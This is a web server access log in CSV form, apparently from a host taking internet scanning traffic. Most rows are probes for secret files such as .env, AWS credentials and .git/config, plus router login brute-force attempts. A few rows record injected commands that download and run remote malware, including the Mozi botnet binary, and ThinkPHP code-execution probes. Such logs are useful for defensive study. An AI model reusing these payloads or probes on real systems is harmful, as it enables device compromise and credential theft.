Host,Time Stamp,Method,Endpoint,Protocol,Status Code,Content Size
54.235.59.67,22/Feb/2023:03:25:01,\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03t\x87\xD9.]?<\xB0o\xD7\xD0\x85%\xBA\xA0<\xDD@|\xCB86M\xCB~X\xDD2\x8C\xE0pD,"\xF7>\x92<\x08\xA1\x15\xCD\xD4\x88\x5C\x99\x82R\xD6`\x8A\x07\x9F\xB8-\xFF`@\xAE\xBD\x12\xCD\x9C1\x8EH\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,400,157.0
54.235.59.67,22/Feb/2023:03:25:01,"-""","""-""","""-",400,157.0
54.235.59.67,22/Feb/2023:03:25:02,GET,/99vu,HTTP/1.1,301,169.0
95.181.161.66,22/Feb/2023:03:25:14,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
95.181.161.66,22/Feb/2023:03:25:14,"-""","""-""","""-",400,0.0
95.181.161.66,22/Feb/2023:03:43:06,GET,/,HTTP/1.1,301,169.0
193.42.33.24,22/Feb/2023:03:45:34,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
193.42.33.24,22/Feb/2023:03:45:34,"-""","""-""","""-",400,0.0
193.32.162.159,17/Feb/2023:03:46:49,GET,/,HTTP/1.1,301,169.0
180.149.125.166,17/Feb/2023:04:02:24,GET,/c/,HTTP/1.1,301,169.0
34.77.127.183,17/Feb/2023:04:15:16,GET,/,HTTP/1.1,301,169.0
179.43.177.242,17/Feb/2023:04:19:00,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
179.43.177.242,17/Feb/2023:04:19:00,"-""","""-""","""-",400,0.0
143.244.50.172,17/Feb/2023:04:40:14,GET,/config/getuser?index=0,HTTP/1.1,301,169.0
37.44.238.231,17/Feb/2023:04:48:31,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.231,17/Feb/2023:04:48:31,"-""","""-""","""-",400,0.0
89.248.165.249,17/Feb/2023:05:16:25,\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie:,mstshash=Administr,,400,157.0
102.37.219.164,17/Feb/2023:05:23:08,GET,/.env,HTTP/1.1,301,169.0
102.37.219.164,17/Feb/2023:05:23:09,POST,/,HTTP/1.1,301,169.0
179.43.177.242,17/Feb/2023:05:26:03,GET,/,HTTP/1.1,301,169.0
103.173.157.210,17/Feb/2023:05:43:57,GET,/config/getuser?index=0,HTTP/1.1,301,169.0
37.44.238.231,17/Feb/2023:05:48:03,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.231,17/Feb/2023:05:48:03,"-""","""-""","""-",400,0.0
185.224.128.236,17/Feb/2023:05:51:30,\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\x89\x22\x07h\x00\xA8X\xB8\xF3P0b\xE0\xA1nV\x16\x1C\xC2\xE1:n\xC6\x94L\x83\x1E\xF6\x5Cy\x8C\x0B,"q\x8F\xEE\x08\xB0\xDF\xF0\xBA\x14\xE2\x14\xA6[\x99\x1Ap\xE3~\xB3e>\xC9\x88\xC1\xA3P\x9A_6.D\x14\x00V\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\x9F\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xAE\xC0\xAC\xC0$\xC0(\xC0#\xC0'\xC0",,400,157.0
149.56.74.88,17/Feb/2023:06:02:40,GET,/.env,HTTP/1.1,301,169.0
149.56.74.88,17/Feb/2023:06:02:40,POST,/,HTTP/1.1,301,169.0
138.197.66.194,17/Feb/2023:06:07:03,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
138.197.66.194,17/Feb/2023:06:07:03,"-""","""-""","""-",400,0.0
192.241.216.23,17/Feb/2023:06:07:51,GET,/portal/redlion,HTTP/1.1,301,169.0
192.241.237.17,17/Feb/2023:06:25:16,GET,/actuator/health,HTTP/1.1,301,169.0
181.114.140.219,17/Feb/2023:06:26:31,GET,/,HTTP/1.1,301,169.0
198.235.24.48,17/Feb/2023:06:46:06,GET,/,HTTP/1.1,301,169.0
162.243.144.15,17/Feb/2023:06:46:07,GET,/hudson,HTTP/1.1,301,169.0
45.95.169.160,17/Feb/2023:06:46:30,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
45.95.169.160,17/Feb/2023:06:46:30,"-""","""-""","""-",400,0.0
193.32.162.159,17/Feb/2023:06:47:27,GET,/,HTTP/1.1,301,169.0
134.209.184.61,17/Feb/2023:07:00:37,"-""","""-""","""-",400,157.0
134.209.184.61,17/Feb/2023:07:00:37,"-""","""-""","""-",400,157.0
134.209.184.61,17/Feb/2023:07:00:37,GET,/,HTTP/1.1,301,169.0
134.209.184.61,17/Feb/2023:07:00:38,GET,/client/get_targets,HTTP/1.1,301,169.0
31.202.56.108,17/Feb/2023:07:47:23,GET,/,HTTP/1.1,301,169.0
138.197.69.142,17/Feb/2023:07:57:14,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
138.197.69.142,17/Feb/2023:07:57:15,"-""","""-""","""-",400,0.0
45.95.169.160,17/Feb/2023:08:01:09,GET,/,HTTP/1.1,301,169.0
103.89.14.169,17/Feb/2023:08:09:34,CONNECT,cipicaoadminpanel.xyz:443,HTTP/1.1,400,157.0
45.95.169.160,17/Feb/2023:08:11:13,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
45.95.169.160,17/Feb/2023:08:11:13,"-""","""-""","""-",400,0.0
193.32.162.159,17/Feb/2023:08:12:22,GET,/,HTTP/1.1,301,169.0
52.167.144.57,17/Feb/2023:08:22:35,GET,/robots.txt,HTTP/1.1,301,169.0
138.197.69.142,17/Feb/2023:08:23:06,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
138.197.69.142,17/Feb/2023:08:23:07,"-""","""-""","""-",400,0.0
45.95.169.160,17/Feb/2023:08:26:43,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
45.95.169.160,17/Feb/2023:08:26:44,"-""","""-""","""-",400,0.0
36.92.120.85,17/Feb/2023:08:38:58,GET,/,HTTP/1.1,301,169.0
45.95.169.160,17/Feb/2023:08:44:13,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
45.95.169.160,17/Feb/2023:08:44:13,"-""","""-""","""-",400,0.0
138.197.66.194,17/Feb/2023:08:48:04,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
138.197.66.194,17/Feb/2023:08:48:04,"-""","""-""","""-",400,0.0
143.244.50.172,17/Feb/2023:08:50:54,GET,/config/getuser?index=0,HTTP/1.1,301,169.0
45.95.169.160,17/Feb/2023:08:52:03,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
45.95.169.160,17/Feb/2023:08:52:04,"-""","""-""","""-",400,0.0
5.45.207.66,17/Feb/2023:09:38:03,GET,/robots.txt,HTTP/1.1,301,169.0
5.255.253.143,17/Feb/2023:09:38:07,GET,/,HTTP/1.1,301,169.0
103.43.19.20,17/Feb/2023:09:41:31,GET,/,HTTP/1.1,301,169.0
45.95.169.160,17/Feb/2023:09:45:27,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
45.95.169.160,17/Feb/2023:09:45:27,"-""","""-""","""-",400,0.0
179.43.177.242,17/Feb/2023:10:04:07,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
179.43.177.242,17/Feb/2023:10:04:07,"-""","""-""","""-",400,0.0
45.95.169.160,17/Feb/2023:10:08:06,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
45.95.169.160,17/Feb/2023:10:08:06,"-""","""-""","""-",400,0.0
193.32.162.159,17/Feb/2023:10:19:18,GET,/,HTTP/1.1,301,169.0
167.248.133.117,17/Feb/2023:10:21:21,GET,/,HTTP/1.1,301,169.0
167.248.133.117,17/Feb/2023:10:21:21,GET,/,HTTP/1.1,301,169.0
167.248.133.117,17/Feb/2023:10:21:22,PRI,*,HTTP/2.0,400,157.0
95.237.23.190,17/Feb/2023:10:41:58,GET,/,HTTP/1.0,301,169.0
179.43.177.242,17/Feb/2023:11:07:28,GET,/,HTTP/1.1,301,169.0
103.43.19.36,17/Feb/2023:11:08:56,GET,/,HTTP/1.1,301,169.0
59.89.129.15,17/Feb/2023:11:24:18,GET,/,HTTP/1.1,301,169.0
159.65.111.248,17/Feb/2023:11:28:11,GET,/,HTTP/1.0,301,169.0
125.43.81.241,17/Feb/2023:11:31:46,POST,/GponForm/diag_Form?images/,HTTP/1.1,301,169.0
125.43.81.241,17/Feb/2023:11:31:47,"-""","""-""","""-",400,157.0
138.197.69.142,17/Feb/2023:11:49:40,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
138.197.69.142,17/Feb/2023:11:49:41,"-""","""-""","""-",400,0.0
165.227.0.21,17/Feb/2023:11:55:04,GET,/,HTTP/1.0,301,169.0
193.32.162.159,17/Feb/2023:11:55:23,GET,/,HTTP/1.1,301,169.0
107.170.253.9,17/Feb/2023:11:59:53,GET,/,HTTP/1.1,301,169.0
143.42.102.54,17/Feb/2023:12:07:24,GET,/,HTTP/1.1,301,169.0
142.93.138.30,17/Feb/2023:12:40:21,"-""","""-""","""-",400,157.0
142.93.138.30,17/Feb/2023:12:40:21,"-""","""-""","""-",400,157.0
142.93.138.30,17/Feb/2023:12:40:21,GET,/,HTTP/1.1,301,169.0
142.93.138.30,17/Feb/2023:12:40:22,GET,/client/get_targets,HTTP/1.1,301,169.0
143.244.50.172,17/Feb/2023:12:51:29,GET,/config/getuser?index=0,HTTP/1.1,301,169.0
117.33.227.207,17/Feb/2023:13:06:27,GET,/,HTTP/1.1,301,169.0
194.87.151.116,17/Feb/2023:13:08:13,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.116,17/Feb/2023:13:08:14,"-""","""-""","""-",400,0.0
45.155.126.211,17/Feb/2023:13:16:10,GET,/,HTTP/1.1,301,169.0
198.199.101.62,17/Feb/2023:13:21:26,"-""","""-""","""-",400,157.0
180.252.55.181,17/Feb/2023:13:37:56,GET,/,HTTP/1.1,301,169.0
193.142.146.101,17/Feb/2023:13:41:16,GET,/,HTTP/1.1,301,169.0
198.235.24.13,17/Feb/2023:13:42:03,"-""","""-""","""-",400,157.0
43.158.217.52,17/Feb/2023:13:55:41,GET,/,HTTP/1.1,301,169.0
143.42.102.188,17/Feb/2023:13:56:03,GET,/,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:50,\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x039\xA2'\x9E@\xC22\xBB\x8FA\x9F\x16\x188\x22\xCAl_\xFE\xBA~\xFE\x84\xBE\x14\xC0_s\x1A\xBE9',"-k\xF4\x9C\xFC\x04\xA49'\x9F\xD9.\x02\xC0\x9Dq\x01\xAF\xC9\x7F\x01\x9A\xFA(\x80\xF2\x7F\xBD\x1A\x1D\x80-\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,400,157.0
134.122.110.201,17/Feb/2023:14:00:50,GET,/,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,"-""","""-""","""-",400,157.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/info.php,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/s/2313e2235313e2933313e24313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/.DS_Store,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/server-status,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/?rest_route=/wp/v2/users/,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/.git/config,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/.env,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/.vscode/sftp.json,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/debug/default/view?panel=config,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/telescope/requests,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/login.action,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/about,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/api/search?folderIds=0,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/config.json,HTTP/1.1,301,169.0
134.122.110.201,17/Feb/2023:14:00:51,GET,/v2/_catalog,HTTP/1.1,301,169.0
152.89.196.211,17/Feb/2023:14:01:15,GET,/?XDEBUG_SESSION_START=phpstorm,HTTP/1.1,301,169.0
43.153.10.221,17/Feb/2023:14:14:59,GET,/,HTTP/1.1,301,169.0
209.141.51.222,17/Feb/2023:14:20:56,GET,/,HTTP/1.1,301,169.0
209.141.51.222,17/Feb/2023:14:20:58,GET,/favicon.ico,HTTP/1.1,301,169.0
205.185.121.69,17/Feb/2023:14:21:07,GET,/,HTTP/1.1,301,169.0
205.185.121.69,17/Feb/2023:14:21:09,GET,/favicon.ico,HTTP/1.1,301,169.0
27.71.224.116,17/Feb/2023:14:30:32,"-""","""-""","""-",400,157.0
37.44.238.231,17/Feb/2023:15:19:57,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.231,17/Feb/2023:15:19:57,"-""","""-""","""-",400,0.0
152.89.196.211,17/Feb/2023:15:23:09,GET,/actuator/gateway/routes,HTTP/1.1,301,169.0
128.14.141.34,17/Feb/2023:15:25:59,GET,/,HTTP/1.1,301,169.0
179.43.177.242,17/Feb/2023:16:17:37,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
179.43.177.242,17/Feb/2023:16:17:37,"-""","""-""","""-",400,0.0
193.111.250.222,17/Feb/2023:16:51:51,GET,/,HTTP/1.1,301,169.0
179.43.177.242,17/Feb/2023:17:00:44,GET,/,HTTP/1.1,301,169.0
185.246.220.98,17/Feb/2023:17:01:50,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
185.246.220.98,17/Feb/2023:17:01:50,"-""","""-""","""-",400,0.0
193.111.250.222,17/Feb/2023:17:15:59,GET,/,HTTP/1.1,301,169.0
163.172.117.134,17/Feb/2023:17:18:59,GET,/,HTTP/1.1,301,169.0
163.172.117.134,17/Feb/2023:17:19:05,GET,/HNAP1,HTTP/1.1,301,169.0
163.172.117.134,17/Feb/2023:17:19:12,POST,/onvif/device_service,HTTP/1.1,301,169.0
163.172.117.134,17/Feb/2023:17:19:14,GET,/PSIA/index,HTTP/1.1,301,169.0
109.237.97.180,17/Feb/2023:17:21:50,GET,/.env,HTTP/1.1,301,169.0
109.237.97.180,17/Feb/2023:17:21:50,\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\x96\xD0uu\x19\x14\xFC-,\x84\xD3\xE4\xDC\x12\x19\x9D\xE5\xB6\x9C+4\x14\xEA\x95\x9C\x0F#\xB3\x01\xDD5\xF7,"\xE7qG\xD3\x8C\xBFfD\xE2C\xBD+-\xCD6\x99(\x1D:Q>\xC96\xA0\x1B\x84\xABq\xAB1\xAAH\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0",400,157.0
109.237.97.180,17/Feb/2023:17:21:51,POST,/.env,HTTP/1.1,301,169.0
109.237.97.180,17/Feb/2023:17:21:51,GET,/.aws/credentials,HTTP/1.1,301,169.0
195.133.40.16,17/Feb/2023:17:48:42,GET,/,HTTP/1.1,301,169.0
185.180.143.138,17/Feb/2023:18:23:58,GET,/cgi-bin/authLogin.cgi,HTTP/1.1,301,169.0
185.246.220.98,17/Feb/2023:18:44:23,GET,/,HTTP/1.1,301,169.0
193.32.162.159,17/Feb/2023:18:51:39,GET,/,HTTP/1.1,301,169.0
192.155.90.220,17/Feb/2023:19:10:56,"-""","""-""","""-",400,157.0
193.111.250.222,17/Feb/2023:19:17:52,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
193.111.250.222,17/Feb/2023:19:17:52,"-""","""-""","""-",400,0.0
139.162.130.126,17/Feb/2023:19:19:56,GET,/,HTTP/1.0,301,169.0
139.177.178.87,17/Feb/2023:19:20:20,GET,/,HTTP/1.0,301,169.0
139.177.178.87,17/Feb/2023:19:20:20,lv|'|'|VHJvamFuX0M0NkY2RTk=|'|'|MARK|'|'|user|'|'|2013-11-22|'|'||'|'|Win,XP|'|'|No|'|'|0.6.4|'|'|..|'|'||'|'|[endof],,400,157.0
139.177.178.87,17/Feb/2023:19:20:21,"-""","""-""","""-",400,157.0
139.177.178.87,17/Feb/2023:19:20:21,"-""","""-""","""-",400,157.0
139.177.178.87,17/Feb/2023:19:20:22,"-""","""-""","""-",400,157.0
139.177.178.87,17/Feb/2023:19:20:22,"-""","""-""","""-",400,157.0
139.177.178.87,17/Feb/2023:19:20:22,"-""","""-""","""-",400,157.0
139.177.178.87,17/Feb/2023:19:20:23,"-""","""-""","""-",400,157.0
139.177.178.87,17/Feb/2023:19:20:23,"-""","""-""","""-",400,157.0
139.177.178.87,17/Feb/2023:19:20:23,"-""","""-""","""-",400,157.0
139.177.178.87,17/Feb/2023:19:20:24,"-""","""-""","""-",400,157.0
139.177.178.87,17/Feb/2023:19:20:24,A\x00\x00\x00\x03fH\xBBd~\x8E\xFC\x94g\xD2\xDB\xFC\xEE\x8D\xFF\x98,\xB1\xBET\xA4\x9AZ\x9A\xA0?\x90\xE0\xF2t0\x5C\xED\xAE\xACX\x98\xDEJ\xEC\xF2\xC8\x9Cl\xD0\x9C\xC0\xE0\x98\x12\x8F\xE7\xCB\x8F\xA1\xA3\x16\xF1J\xA9<\xBD\xDA`,,400,157.0
139.177.178.87,17/Feb/2023:19:20:24,"-""","""-""","""-",400,157.0
128.199.77.96,17/Feb/2023:19:23:18,GET,/,HTTP/1.0,301,169.0
193.32.162.159,17/Feb/2023:19:25:56,GET,/,HTTP/1.1,301,169.0
183.136.225.32,17/Feb/2023:19:50:25,GET,/,HTTP/1.1,301,169.0
183.136.225.32,17/Feb/2023:19:53:13,GET,/,HTTP/1.1,301,169.0
183.136.225.32,17/Feb/2023:19:53:33,GET,/assets/img/favicon.png,HTTP/1.1,301,169.0
183.136.225.32,17/Feb/2023:19:53:52,GET,/robots.txt,HTTP/1.1,301,169.0
172.104.131.24,17/Feb/2023:19:56:04,GET,/gate.php,HTTP/1.1,301,169.0
45.95.169.110,17/Feb/2023:20:20:16,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
45.95.169.110,17/Feb/2023:20:20:16,"-""","""-""","""-",400,0.0
178.21.204.48,17/Feb/2023:21:00:14,GET,/,HTTP/1.1,301,169.0
23.146.240.250,17/Feb/2023:21:02:58,GET,/,HTTP/1.1,301,169.0
172.105.77.209,17/Feb/2023:21:05:52,"-""","""-""","""-",400,157.0
45.61.188.225,17/Feb/2023:21:07:21,GET,/,HTTP/1.1,301,169.0
209.141.48.150,17/Feb/2023:21:25:09,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
209.141.48.150,17/Feb/2023:21:25:10,"-""","""-""","""-",400,0.0
193.32.127.233,17/Feb/2023:21:46:44,GET,/,HTTP/1.1,301,169.0
43.246.208.2,17/Feb/2023:22:13:09,GET,/,HTTP/1.1,301,169.0
152.32.233.216,17/Feb/2023:22:13:46,GET,/,HTTP/1.1,301,169.0
152.32.233.216,17/Feb/2023:22:13:48,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x1F\xFCQ3\xA1m{!\xE40\x9B\xBD\xCB\xFA\xACLo\x81\xA5u\xC1\xD1\xC30\x1D\xD6\xDBEL\xC4`\x07,"RM\xA3\xE9\x11\xAF\x01\xFFl\x92\xA2k-\x14\x94\xBD\xEEO\x07\x0C]\xD0^\x11<\xB3\x90W{6\xEA\x8C\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,400,157.0
45.95.169.110,17/Feb/2023:22:29:45,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
45.95.169.110,17/Feb/2023:22:29:45,"-""","""-""","""-",400,0.0
185.162.10.124,17/Feb/2023:22:48:52,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
185.162.10.124,17/Feb/2023:22:48:52,"-""","""-""","""-",400,0.0
103.43.19.36,17/Feb/2023:23:09:10,GET,/,HTTP/1.1,301,169.0
52.146.17.145,17/Feb/2023:23:42:33,GET,/.ebextensions/,HTTP/1.1,301,169.0
49.117.61.220,17/Feb/2023:23:46:46,GET,/,HTTP/1.1,301,169.0
193.32.162.159,18/Feb/2023:00:01:19,GET,/,HTTP/1.1,301,169.0
193.111.250.222,18/Feb/2023:00:10:32,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
193.111.250.222,18/Feb/2023:00:10:32,"-""","""-""","""-",400,0.0
92.118.39.82,18/Feb/2023:00:31:33,GET,/,HTTP/1.1,301,169.0
106.75.80.230,18/Feb/2023:00:32:35,GET,/,HTTP/1.1,301,169.0
64.227.41.39,18/Feb/2023:01:03:24,GET,/aaa9,HTTP/1.1,301,169.0
64.227.41.39,18/Feb/2023:01:03:25,\x16\x03\x01\x00{\x01\x00\x00w\x03\x03t*\x1C\x1E\x83\xB5\xCE\xC4\xEF?\xAF\x8D\xDD,\xD6\x84oT\x98\x99\x88$\xE8\xCF\xB1\xB1p\x9F6{\x0Fb\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0,,400,157.0
64.227.41.39,18/Feb/2023:01:03:25,GET,/aab8,HTTP/1.1,301,169.0
64.227.41.39,18/Feb/2023:01:03:26,"-""","""-""","""-",400,157.0
193.111.250.222,18/Feb/2023:01:28:44,GET,/,HTTP/1.1,301,169.0
122.194.11.74,18/Feb/2023:01:34:37,GET,/shell?cd+/tmp;rm+-rf+*;wget+http://102.33.47.9:47530/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,HTTP/1.1,301,169.0
193.32.162.159,18/Feb/2023:01:43:37,GET,/,HTTP/1.1,301,169.0
78.128.81.95,18/Feb/2023:01:53:17,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
78.128.81.95,18/Feb/2023:01:53:17,"-""","""-""","""-",400,0.0
143.244.50.172,18/Feb/2023:01:53:52,GET,/config/getuser?index=0,HTTP/1.1,301,169.0
125.41.1.239,18/Feb/2023:02:33:10,GET,/boaform/admin/formLogin?username=adminisp&psd=adminisp,HTTP/1.0,301,169.0
185.246.220.98,18/Feb/2023:02:42:49,GET,/,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:03:36:54,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:03:36:54,"-""","""-""","""-",400,0.0
104.152.52.2,15/Feb/2023:03:40:39,GET,/,HTTP/1.0,301,169.0
152.89.196.211,15/Feb/2023:03:49:28,GET,/index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:03:51:25,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:03:51:25,"-""","""-""","""-",400,0.0
79.110.62.234,15/Feb/2023:03:54:14,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:03:54:15,"-""","""-""","""-",400,0.0
194.87.151.209,15/Feb/2023:04:09:58,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:04:09:58,"-""","""-""","""-",400,0.0
143.244.50.172,15/Feb/2023:04:15:24,GET,/config/getuser?index=0,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:04:23:15,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:04:23:15,"-""","""-""","""-",400,0.0
194.87.151.209,15/Feb/2023:04:31:05,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:04:31:05,"-""","""-""","""-",400,0.0
193.32.162.159,15/Feb/2023:04:34:28,GET,/,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:04:43:21,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:04:43:21,"-""","""-""","""-",400,0.0
60.225.64.129,15/Feb/2023:04:43:59,GET,/login.cgi?cli=aa%20aa%27;wget%20http://1.116.115.169/bin%20-O%20-%3E%20/tmp/hk;sh%20/tmp/hk%27$,HTTP/1.1,400,157.0
194.87.151.209,15/Feb/2023:04:44:18,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:04:44:19,"-""","""-""","""-",400,0.0
152.89.196.211,15/Feb/2023:04:48:05,GET,/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>,HTTP/1.1,301,169.0
138.68.224.69,15/Feb/2023:04:48:41,GET,/manager/html,HTTP/1.1,301,169.0
152.89.196.211,15/Feb/2023:04:49:43,GET,/?XDEBUG_SESSION_START=phpstorm,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:05:12:09,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:05:12:09,"-""","""-""","""-",400,0.0
35.195.93.98,15/Feb/2023:05:19:16,GET,/,HTTP/1.1,301,169.0
66.240.205.34,15/Feb/2023:05:23:52,"-""","""-""","""-",400,157.0
194.87.151.209,15/Feb/2023:05:27:40,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:05:27:40,"-""","""-""","""-",400,0.0
79.110.62.234,15/Feb/2023:05:32:04,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
79.110.62.234,15/Feb/2023:05:32:04,"-""","""-""","""-",400,0.0
185.246.220.98,15/Feb/2023:05:37:05,GET,/,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:05:37:29,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:05:37:29,"-""","""-""","""-",400,0.0
192.241.237.22,15/Feb/2023:05:44:50,"-""","""-""","""-",400,157.0
194.87.151.209,15/Feb/2023:05:45:55,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
194.87.151.209,15/Feb/2023:05:45:55,"-""","""-""","""-",400,0.0
20.68.180.129,15/Feb/2023:05:48:40,GET,/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:41,GET,/core/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:41,GET,/web/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:41,GET,/app/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:42,GET,/laravel/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:42,GET,/crm/.env,HTTP/1.1,301,169.0
20.68.180.129,15/Feb/2023:05:48:42,GET,/backend/.env,HTTP/1.1,301,169.0
